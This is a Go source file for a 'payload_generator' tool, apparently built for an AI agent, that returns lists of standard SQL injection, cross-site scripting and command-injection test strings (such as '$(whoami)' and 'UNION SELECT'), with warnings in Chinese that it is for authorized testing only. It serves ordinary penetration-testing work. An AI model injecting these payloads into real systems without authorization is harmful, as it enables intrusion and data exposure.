package utility

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
)

// PayloadGeneratorTool 生成常见安全测试用负载字符串（仅用于授权测试）。
type PayloadGeneratorTool struct{}

func (t *PayloadGeneratorTool) Name() string { return "payload_generator" }

func (t *PayloadGeneratorTool) Description() string {
	return "生成常见安全测试负载：输入类型 sqli、xss、cmdi（命令注入）等，返回示例字符串。仅用于已授权测试。"
}

func (t *PayloadGeneratorTool) Call(_ context.Context, input string) (string, error) {
	typ := strings.ToLower(strings.TrimSpace(input))
	if typ == "" {
		typ = "help"
	}

	payloads := map[string][]string{}

	switch typ {
	case "sqli", "sql", "sql_injection":
		payloads["sqli"] = []string{
			"' OR '1'='1",
			"\" OR \"1\"=\"1",
			"' UNION SELECT NULL,NULL--",
			"1; SELECT SLEEP(5)--",
			"admin'--",
			"1' AND '1'='1",
		}
	case "xss":
		payloads["xss"] = []string{
			`<script>alert(1)</script>`,
			`"><img src=x onerror=alert(1)>`,
			`javascript:alert(1)`,
			`<svg/onload=alert(1)>`,
			`'-alert(1)-'`,
		}
	case "cmdi", "cmd", "command", "command_injection":
		payloads["cmdi"] = []string{
			`; id`,
			`| whoami`,
			"`whoami`",
			"$(whoami)",
			"& ping -n 1 127.0.0.1 &",
		}
	case "help", "list", "?":
		result := map[string]any{
			"usage": "输入: sqli | xss | cmdi",
			"types": []string{"sqli", "xss", "cmdi"},
		}
		out, _ := json.MarshalIndent(result, "", "  ")
		return string(out), nil
	default:
		return "", fmt.Errorf("未知类型 %q，请使用 sqli、xss 或 cmdi", typ)
	}

	out, _ := json.MarshalIndent(map[string]any{
		"type":     typ,
		"payloads": payloads,
		"warning":  "仅用于已授权的安全测试；禁止未授权使用。",
	}, "", "  ")
	return string(out), nil
}
